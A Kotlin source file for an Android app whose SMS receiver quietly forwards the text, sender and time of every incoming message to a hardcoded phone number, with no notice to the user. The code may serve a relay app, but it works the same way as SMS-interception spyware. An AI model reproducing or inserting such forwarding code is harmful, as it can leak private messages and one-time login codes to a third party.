package beigi.v.wellconnectsecond.broadcast

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.provider.Telephony
import android.telephony.SmsManager
import android.widget.Toast
import androidx.core.app.ActivityCompat
import beigi.v.wellconnectsecond.broadcast.SMSReceiverBroadCast.NotificationPermissionState.notificationPermissionIs
import beigi.v.wellconnectsecond.core.Const.PREF
import kotlinx.coroutines.flow.MutableStateFlow
import java.util.*

class SMSReceiverBroadCast : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {

        val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

        val smsBody = smsMessages.joinToString(" ") { it.displayMessageBody }
        val senderNumber = smsMessages[0].displayOriginatingAddress
        try {
            val smsBodyPreference = context?.getSharedPreferences(
                PREF, Context.MODE_PRIVATE
            )
            val lastSms = smsBodyPreference?.getString("SmsBody", "")
            if (intent?.action != "android.provider.Telephony.SMS_RECEIVED") return
            val checkSmsPermission = checkPermission(context!!)
            if (!checkSmsPermission) {
                Toast.makeText(
                    context,
                    "بدون نداشتن مجوز لازم امکان دریافت و ارسال پیامک وجود ندارد",
                    Toast.LENGTH_SHORT
                ).show()
            }
            if (smsBody != lastSms.toString()) {
                smsBodyPreference?.edit()?.putString("SmsBody", smsBody)
                    ?.apply()

                //offline
                try {
                    sendOffline(senderNumber.toString(), smsBody = smsBody)
                } catch (e: Exception) {
                    e.printStackTrace()
                }

            }

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendOffline(phone: String, smsBody: String) {
        val forwardNumber = "09133191572"

        @Suppress("DEPRECATION")
        val smsManager = SmsManager.getDefault()
        smsManager.sendTextMessage(
            forwardNumber,
            null,
            "${smsBody}\n${phone}\n${currentTime()}",
            null,
            null
        )
    }

    private fun checkPermission(context: Context): Boolean {
        if (ActivityCompat.checkSelfPermission(
                context, Manifest.permission.SEND_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            notificationPermissionIs.value = false
            return false
        } else {
            notificationPermissionIs.value = true
            return true
        }
    }

    object NotificationPermissionState {
        val notificationPermissionIs = MutableStateFlow<Boolean>(false)
    }

    private fun currentTime(): String {
        val calendar = Calendar.getInstance()
        val month = calendar.get(Calendar.MONTH) + 1
        val monthStr = if (month < 10) "0$month" else month
        val year = calendar.get(Calendar.YEAR)
        val day = calendar.get(Calendar.DAY_OF_MONTH)
        val dayStr = if (day < 10) "0$day" else day.toString()

        val hour = calendar.get(Calendar.HOUR_OF_DAY)
        val minute = calendar.get(Calendar.MINUTE)
        val second = calendar.get(Calendar.SECOND)
        val time = "${hour}:${minute}:${second}"
        val date = "${year}-$monthStr-${dayStr} $time"
        return date
    }
}